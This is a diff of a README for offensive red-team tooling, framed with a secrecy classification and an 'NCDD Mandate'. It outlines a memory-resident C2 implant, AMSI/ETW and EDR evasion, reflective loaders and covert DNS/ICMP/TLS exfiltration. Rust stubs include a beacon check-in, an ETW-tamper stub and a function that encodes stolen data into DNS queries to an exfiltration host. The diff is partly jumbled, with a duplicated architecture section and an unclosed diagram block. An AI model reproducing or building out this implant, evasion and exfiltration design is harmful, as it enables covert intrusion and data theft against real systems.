@@ -8,6 +8,7 @@
 **Classification:** STRENGT FORTRIELIG // OMEGA Clearance Required  
 **Derived From:** NCDD Mandate 2026 §3.1 & §4.2 (Dual-Use Technology Controls)  
 **Access:** Air-gapped environments only. Strict need-to-know basis.
+
 Skeleton and illustrative components for red-team / adversary emulation tooling developed under NCDD Mandate 2026.
 
 ### Architecture Overview
@@ -21,17 +22,24 @@ graph TD
     E --> A[Data exfiltrated back to Operator]
     
 
-Modules
+### Modules
 
-beacon-core — Memory-resident C2 implant (Rust)
-edr-evasion — AMSI/ETW bypass & EDR evasion techniques
-exfil-channels — DNS, ICMP, TLS covert data exfiltration
-loader-stubs — Reflective loaders for position-independent code
+- beacon-core — Memory-resident C2 implant (Rust)  
+- edr-evasion — AMSI/ETW bypass & EDR evasion techniques  
+- exfil-channels — DNS, ICMP, TLS covert data exfiltration  
+- loader-stubs — Reflective loaders for position-independent code  
 
+### Architecture Overview
+
+```mermaid
+graph TD
+    A[Operator C2 Server] --> B[Beacon Implant memory resident]
+    B --> C[Reflective Loader in memory exec]
+    C --> D[EDR Evasion Layer AMSI ETW bypass]
+    D --> E[Exfil Channel DNS ICMP TLS covert]
+    E --> A[Data exfiltrated back to Operator]
 Module Stubs / Quick Examples
-Illustrative code snippets only. Real payloads and full implementations are compartmented, air-gapped, and mandate-protected.
-beacon-core (memory-resident check-in stub)
-
+Illustrative code snippets only. Real payloads and full implementations are compartmented and mandate-protected.
 beacon-core (memory-resident check-in stub)
 Rust// beacon-core/src/checkin.rs
 // MITRE ATT&CK: T1071.001 (Application Layer Protocol), T1573 (Encrypted Channel)
@@ -53,7 +61,7 @@ fn beacon_checkin() -> Result<String, std::io::Error> {
     
     Ok(response.trim().to_string())
 }
-edr-evasion (ETW provider tamper stub)
+edr-evasion (ETW tamper stub)
 Rust// edr-evasion/src/etw_tamper.rs
 // Technique: ObRegisterCallbacks unhooking / ETW provider disable
 // Detection hypothesis: may trigger CrowdStrike behavioral alert on suspicious kernel callback modification
@@ -74,7 +82,7 @@ fn exfil_dns(data: &[u8]) -> String {
     let encoded = base32::encode(base32::Alphabet::RFC4648 { padding: false }, data);
     format!("{}.exfil.ncdd-no.internal", encoded.to_lowercase())
 }
-These are illustrative stubs only. Full operational implementations require OMEGA clearance and air-gapped validation.
+These are illustrative only. Full implementations require OMEGA clearance and air-gapped validation.
 
 Important
 
